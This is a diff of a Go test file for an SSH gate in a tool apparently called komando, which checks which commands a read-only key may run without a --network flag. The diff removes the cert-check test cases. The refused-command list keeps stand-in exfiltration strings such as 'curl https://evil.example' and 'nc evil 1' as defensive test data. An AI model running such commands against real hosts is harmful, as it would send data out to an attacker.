@@ -36,8 +36,7 @@ var (
 )
 
 // A read key added without --network runs only komando's own reads of
-// targets in the inventory: nothing that dials a place the key names (cert
-// check of a URL), and no program of the key's choosing (exec,
+// targets in the inventory: no program of the key's choosing (exec,
 // docker exec, cluster kubernetes exec, snippet exec), which could send rows out
 // in a URL or a DNS name.
 func TestGateNoNetwork(t *testing.T) {
@@ -46,7 +45,6 @@ func TestGateNoNetwork(t *testing.T) {
 	mustRun(t, "snippet", "create", "my-df", "df -h", "--read-only")
 	const N = "SSH_GATE_NETWORK_REQUIRED"
 	refused := []string{
-		"cert check https://evil.example", "cert check web https://evil.example/x", "cert check smtps://evil.example",
 		"host ssh exec web --read-only -- curl https://evil.example", "host ssh exec web --read-only -- uptime",
 		"host ssh exec web --read-only --script -", "host ssh exec web --read-only --cmd 'nc evil 1'",
 		"docker exec web app --read-only -- ls",
@@ -64,19 +62,12 @@ func TestGateNoNetwork(t *testing.T) {
 			t.Errorf("%q, full key: %q, want it to run", line, got)
 		}
 	}
-	// HOST:PORT reads as an ad hoc server too, which no key reaches
-	// (gateLocalTarget refuses it before the network rule)
-	for _, line := range []string{"cert check evil.example:443", "cert check 203.0.113.9:8443"} {
-		if got := gateKeyAnswer(t, line, readKey); got == "" {
-			t.Errorf("%q, read key: runs", line)
-		}
-	}
 	allowed := []string{
 		"", "list", "version", "status", "ssh-gate status", "test web", "host ssh test web", "logs web --unit nginx",
 		"fs cat web /etc/hosts", "fs list web /var/log", "docker ps web",
 		"docker logs web app", "database postgres query pg 'select 1'", "db schema pg", "db activity pg", "cache get c a", "cache redis raw c GET a",
-		"cache info c", "cluster kubernetes raw k8s get pods", "cluster status k8s", "cluster logs k8s api-1", "cert check web",
-		"cert check web --path /etc/ssl/site.pem", "pkg security web", "pkg installed web", "copy s3:a.txt -",
+		"cache info c", "cluster kubernetes raw k8s get pods", "cluster status k8s", "cluster logs k8s api-1",
+		"pkg security web", "pkg installed web", "copy s3:a.txt -",
 		"storage s3 object list s3", "audit list", "export", "conn test pg", "vpn socks list",
 		"host ssh exec --help", "cluster info k8s", "registry oci image list reg",
 		"group show web", "group list", "snippet show disk", "snippet list", // a read key keeps the reads of groups and snippets
@@ -248,10 +239,10 @@ func TestSSHGateLineNetwork(t *testing.T) {
 	}
 }
 
-// help and completion print text: no key needs --network for them.
-func TestGateNoNetworkHelp(t *testing.T) {
+// completion prints a script: no key needs --network for it.
+func TestGateNoNetworkCompletion(t *testing.T) {
 	invHome(t)
-	for _, line := range []string{"help", "help net http", "help exec", "completion bash", "completion zsh"} {
+	for _, line := range []string{"completion bash", "completion zsh"} {
 		if got := gateKeyAnswer(t, line, readKey); got != "" {
 			t.Errorf("%q, read key: %q, want it to run", line, got)
 		}
